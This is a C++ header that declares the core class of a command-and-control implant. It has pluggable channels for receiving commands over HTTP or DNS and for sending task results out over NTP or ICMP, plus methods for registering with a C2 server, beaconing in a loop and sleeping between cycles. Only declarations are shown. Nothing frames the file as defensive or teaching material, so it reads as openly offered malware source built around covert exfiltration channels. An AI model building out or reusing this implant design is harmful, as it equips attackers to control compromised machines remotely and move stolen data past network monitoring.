#pragma once

#include <string>
#include <map>
#include <vector>
#include <iostream>
#include <thread>
#include <chrono>
#include "../data/msgpack/msgpack.h"

// --- Signatures ---

// Ingress: Returns a JSON object (command + metadata), takes current UUID
using IngressFunc = nlohmann::json(*)(std::string implant_uuid);

// Output: Takes the result string and sends it away (Requires 3 args to match cycle logic)
using EgressFunc = void (*)(std::string implant_uuid, std::string text_data, std::string task_uuid);

// --- Settings Enums ---

//jinja this
enum class InMethod {
    HTTP,
    DNS,
    // Add others via Jinja
};

//jinja this
enum class OutMethod {
    NTP,
    ICMP,
    // Add others via Jinja
};

// --- The Dispatcher Class ---

class C2Implant {
public:
    // --- Static Storage for Strategies (Shared by all) ---
    // Naming: s_camelCase for statics
    static std::map<InMethod, IngressFunc> s_ingress_map;
    static std::map<OutMethod, EgressFunc> s_egress_map;

    // --- Resolvers (Optional: String -> Enum) ---
    static std::map<std::string, InMethod>  s_in_resolver;
    static std::map<std::string, OutMethod> s_out_resolver;

    // --- Instance Data (Specific to this agent) ---
    // Naming: snake_case_ for members
    std::string implant_uuid_;

    // --- Lifecycle Methods ---

    // 1. Wires up the map (Static because it sets up the s_vars)
    static void init();

    // 2. Registers with C2 to get UUID (Instance: modifies implant_uuid_)
    int register_implant(InMethod registration_method);

    // 3. The Main Loop (Instance: uses implant_uuid_)
    void cycle(InMethod get, OutMethod post);

private:
    // Internal helper to wrap sleep logic
    void sleep_implant();
};